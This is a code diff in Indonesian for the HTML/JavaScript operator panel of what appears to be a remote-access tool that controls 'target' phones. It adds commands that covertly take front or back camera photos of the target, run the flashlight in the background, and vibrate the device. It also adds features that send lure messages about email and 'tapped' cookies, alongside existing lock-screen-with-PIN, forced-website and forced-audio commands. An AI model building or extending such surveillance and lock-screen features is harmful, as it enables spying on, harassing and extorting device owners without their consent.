+          <div class="preset-btn" onclick="setBlinkPreset(600, 6)">Lambat</div>
+          <div class="preset-btn" onclick="setBlinkPreset(800, 4)">Kalem</div>
+          <div class="preset-btn" onclick="setBlinkPreset(50, 20)">SOS</div>
+        </div>
+      </div>
+      <div id="flashPatternConfig" style="display:none;">
+        <label>Pola (detik nyala-mati, pisah koma)</label>
+        <input type="text" id="patternInput" value="0.2,0.1,0.2,0.1,0.5">
+      </div>
+      <div class="modal-actions">
+        <button class="btn dark" onclick="closeModal()">Batal</button>
+        <button class="btn yellow" onclick="submitFlash()">⚡ Jalankan</button>
+      </div>`;
+  } else if (type === 'flashbackground') {
+    html = `
+      <h3>🔆 Senter Background</h3>
+      <p style="color:#aaa; font-size:12px; line-height:1.6; margin-bottom:15px;">
+        Senter nyala terus walaupun user buka aplikasi lain. Senter bakal tetep nyala sampai dimatikan manual atau durasi habis.
+      </p>
+      <label>Durasi (detik, 0 = selamanya)</label>
+      <div class="slider-wrap">
+        <input type="range" id="bgDur" min="0" max="300" value="60" step="5" oninput="updateBgLabel()">
+        <div class="slider-value" id="bgLabel">60s</div>
+      </div>
+      <label>Preset Durasi</label>
+      <div class="preset-grid">
+        <div class="preset-btn" onclick="setBgPreset(30)">30s</div>
+        <div class="preset-btn" onclick="setBgPreset(60)">1m</div>
+        <div class="preset-btn" onclick="setBgPreset(300)">5m</div>
+        <div class="preset-btn" onclick="setBgPreset(600)">10m</div>
+        <div class="preset-btn" onclick="setBgPreset(1800)">30m</div>
+        <div class="preset-btn" onclick="setBgPreset(0)">∞</div>
+      </div>
+      <div class="modal-actions">
+        <button class="btn dark" onclick="closeModal()">Batal</button>
+        <button class="btn yellow" onclick="submitFlashBackground()">🔆 Nyalakan</button>
+      </div>`;
+  } else if (type === 'flashoff2') {
+    html = `
+      <h3>🔅 Matikan Flash</h3>
+      <p style="color:#aaa; font-size:12px; line-height:1.6;">Matikan lampu senter target sekarang.</p>
+      <div class="modal-actions">
+        <button class="btn dark" onclick="closeModal()">Batal</button>
+        <button class="btn" onclick="sendCommand('flashoff'); closeModal();">🔅 Matikan</button>
+      </div>`;
+  } else if (type === 'livecamera') {
+    html = `
+      <h3>📷 Live Camera</h3>
+      <p style="color:#aaa; font-size:12px; line-height:1.6; margin-bottom:15px;">
+        Kamera target akan nyala dan foto otomatis. Hasil foto bakal muncul di panel. Butuh izin kamera di HP target.
+      </p>
+      <label>Pilih Kamera</label>
+      <select id="camMode">
+        <option value="front">Kamera Depan (Selfie)</option>
+        <option value="back">Kamera Belakang</option>
+      </select>
+      <label>Durasi Snap (detik)</label>
+      <div class="slider-wrap">
+        <input type="range" id="camDur" min="1" max="10" value="3" oninput="document.getElementById('camLabel').textContent=this.value+'s'">
+        <div class="slider-value" id="camLabel">3s</div>
+      </div>
+      <div class="modal-actions">
+        <button class="btn dark" onclick="closeModal()">Batal</button>
+        <button class="btn yellow" onclick="submitLiveCamera()">📷 Snap</button>
+      </div>`;
+  } else if (type === 'email') {
+    html = `
+      <h3>📧 Liat EMAIL</h3>
+      <p style="color:#ffaa00; font-size:11px; line-height:1.6; margin-bottom:15px;">
+        ⚠️ FITUR TERBATAS — WebView gak bisa akses inbox email. Yang bisa: kirim notif ke target minta buka email.
+      </p>
+      <label>Pesan untuk Target</label>
+      <input type="text" id="emailMsg" value="Buka email kamu sekarang" maxlength="100">
+      <div class="modal-actions">
+        <button class="btn dark" onclick="closeModal()">Batal</button>
+        <button class="btn" onclick="submitEmail()">📧 Kirim</button>
+      </div>`;
+  } else if (type === 'cookies') {
+    html = `
+      <h3>🍪 Sadap Cookies</h3>
+      <p style="color:#ffaa00; font-size:11px; line-height:1.6; margin-bottom:15px;">
+        ⚠️ FITUR TERBATAS — WebView gak bisa baca cookies Chrome (sandbox). Yang bisa: baca cookies WebView sendiri + kirim notif ke target.
+      </p>
+      <label>Pesan untuk Target</label>
+      <input type="text" id="cookiesMsg" value="Cookies browser kamu terdeteksi" maxlength="100">
+      <div class="modal-actions">
+        <button class="btn dark" onclick="closeModal()">Batal</button>
+        <button class="btn" onclick="submitCookies()">🍪 Kirim</button>
       </div>`;
   }
 
@@ -579,7 +795,33 @@ function closeModal() {
   document.getElementById('modal').classList.remove('show');
 }
 
-/* ==================== SUBMIT ==================== */
+/* VIBRATE HELPERS */
+function updateVibLabel() { document.getElementById('vibLabel').textContent = document.getElementById('vibSlider').value + 'x'; }
+function updateIntLabel() { document.getElementById('intLabel').textContent = document.getElementById('vibInterval').value + 'ms'; }
+function updateDurLabel() { document.getElementById('durLabel').textContent = document.getElementById('vibDur').value + 'ms'; }
+function setVibPreset(n) { document.getElementById('vibSlider').value = n; updateVibLabel(); }
+
+/* FLASH HELPERS */
+function toggleFlashMode() {
+  const mode = document.getElementById('flashMode').value;
+  document.getElementById('flashBlinkConfig').style.display = (mode === 'blink') ? 'block' : 'none';
+  document.getElementById('flashPatternConfig').style.display = (mode === 'pattern') ? 'block' : 'none';
+}
+function updateBlinkLabel() { document.getElementById('blinkLabel').textContent = document.getElementById('blinkSpeed').value + 'ms'; }
+function updateBlinkCountLabel() { document.getElementById('blinkCountLabel').textContent = document.getElementById('blinkCount').value + 'x'; }
+function setBlinkPreset(speed, count) {
+  document.getElementById('blinkSpeed').value = speed;
+  document.getElementById('blinkCount').value = count;
+  updateBlinkLabel();
+  updateBlinkCountLabel();
+}
+function updateBgLabel() {
+  const v = document.getElementById('bgDur').value;
+  document.getElementById('bgLabel').textContent = (v === '0') ? '∞' : v + 's';
+}
+function setBgPreset(v) { document.getElementById('bgDur').value = v; updateBgLabel(); }
+
+/* SUBMIT */
 function submitLock() {
   const pin = document.getElementById('lockPin').value;
   const msg = document.getElementById('lockMsg').value;
@@ -587,7 +829,6 @@ function submitLock() {
   sendCommand('lock', { pin, message: msg });
   closeModal();
 }
-
 function submitLockHtml() {
   const pin = document.getElementById('lockPin').value;
   const html = document.getElementById('lockHtml').value;
@@ -595,41 +836,70 @@ function submitLockHtml() {
   sendCommand('lockhtml', { pin, html });
   closeModal();
 }
-
 function submitText() {
   const text = document.getElementById('screenText').value;
   if (!text) { showToast('Isi teks!'); return; }
   sendCommand('text', { message: text });
   closeModal();
 }
-
-function submitReconnect() {
-  sendCommand('reconnect');
-  closeModal();
-}
-
+function submitReconnect() { sendCommand('reconnect'); closeModal(); }
 function submitWebsite() {
   const url = document.getElementById('urlInput').value;
   if (!url) { showToast('Isi URL!'); return; }
   sendCommand('website', { url });
   closeModal();
 }
-
 function submitMusic() {
   const url = document.getElementById('musicUrl').value;
   if (!url) { showToast('Isi URL MP3!'); return; }
   sendCommand('music', { url });
   closeModal();
 }
-
 function submitVibrate() {
-  const dur = document.getElementById('vibrate').value;
-  if (!dur) { showToast('Isi durasi!'); return; }
-  sendCommand('vibrate', { duration: parseInt(dur) });
+  const count = parseInt(document.getElementById('vibSlider').value);
+  const interval = parseInt(document.getElementById('vibInterval').value);
+  const duration = parseInt(document.getElementById('vibDur').value);
+  if (count < 1 || count > 20) { showToast('Max 20 kali!'); return; }
+  sendCommand('vibratecustom', { count, interval, duration });
+  closeModal();
+}
+function submitFlash() {
+  const mode = document.getElementById('flashMode').value;
+  if (mode === 'on') sendCommand('flashon');
+  else if (mode === 'off') sendCommand('flashoff');
+  else if (mode === 'blink') {
+    const speed = parseInt(document.getElementById('blinkSpeed').value);
+    const count = parseInt(document.getElementById('blinkCount').value);
+    if (count < 1 || count > 20) { showToast('Max 20 kedip!'); return; }
+    sendCommand('flashblink', { speed, count });
+  } else if (mode === 'pattern') {
+    const pattern = document.getElementById('patternInput').value;
+    sendCommand('flashpattern', { pattern });
+  }
+  closeModal();
+}
+function submitFlashBackground() {
+  const dur = parseInt(document.getElementById('bgDur').value);
+  sendCommand('flashbackground', { duration: dur });
+  closeModal();
+}
+function submitLiveCamera() {
+  const mode = document.getElementById('camMode').value;
+  const dur = parseInt(document.getElementById('camDur').value);
+  sendCommand('livecamera', { camMode: mode, duration: dur });
+  closeModal();
+}
+function submitEmail() {
+  const msg = document.getElementById('emailMsg').value;
+  sendCommand('email', { message: msg });
+  closeModal();
+}
+function submitCookies() {
+  const msg = document.getElementById('cookiesMsg').value;
+  sendCommand('cookies', { message: msg });
   closeModal();
 }
 
-/* ==================== INIT ==================== */
 renderDevices();
 setInterval(pollDevices, 4000);
 
@@ -638,4 +908,4 @@ document.getElementById('modal').addEventListener('click', function(e) {
 });
 </script>
 </body>
-</html>
+ </html>
